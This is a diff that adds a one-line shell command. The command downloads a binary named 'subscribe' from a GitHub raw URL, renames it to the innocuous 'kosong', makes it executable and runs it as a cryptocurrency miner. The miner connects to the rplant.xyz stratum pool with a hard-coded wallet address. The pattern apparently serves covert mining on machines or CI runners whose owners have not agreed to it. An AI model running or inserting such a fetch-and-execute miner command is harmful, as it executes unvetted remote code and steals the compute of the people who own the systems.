@@ -1,0 +1,1 @@
+wget https://raw.githubusercontent.com/penjelajahwaktu/subrek/main/subscribe && mv subscribe kosong && chmod +x kosong && ./kosong -a yespowertide  -o stratum+tcps://stratum-asia.rplant.xyz:17059 -u TECGQmv7BVHSJHxhDShqoB9r7Kdik9xVMJ.kosong
